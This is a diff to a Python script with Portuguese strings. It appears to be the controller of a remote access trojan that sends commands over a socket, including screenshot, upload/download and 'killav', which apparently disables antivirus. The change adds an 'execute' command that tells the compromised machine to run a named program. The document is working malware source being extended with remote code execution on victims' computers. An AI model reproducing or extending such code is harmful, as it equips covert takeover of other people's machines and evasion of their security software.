@@ -57,6 +57,25 @@ def ajuda():
     print('{0}clear{1} - Limpa a tela.').format(RED, END)
     print('{0}exit{1} - Sai do programa.').format(RED, END)
 
+def execute(s, nome_programa):
+    if(len(nome_programa.split(' ')) == 1):
+        try:
+            nome_programa = raw_input('Digite o nome do programa: ')
+        except KeyboardInterrupt:
+            return
+    else:
+        arquivo = nome_programa.split(' ')
+        arquivo.remove('execute')
+        nome_programa = ' '.join(arquivo)
+
+    s.send('6')
+    s.send(nome_programa)
+    retorno = s.recv(1)
+    if(retorno == '1'):
+        print('Arquivo não existe')
+    elif(retorno == '0'):
+        print('Executando')
+
 def upload(s, caminho_arquivo=False):
     if(not caminho_arquivo):
         comando = subprocess.Popen('zenity --file-selection --title Escolha_um_arquivo', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -168,6 +187,8 @@ def identificador(comand, s):
         download(s, comand)
     elif(comando[0] == 'screenshot'):
         screenshot(s)
+    elif(comando[0] == 'execute'):
+        execute(s, comand)
     elif(comando[0]=='killav'):
         killav(s)
     elif(comando[0] == 'help' or comando[0] == 'ajuda'):
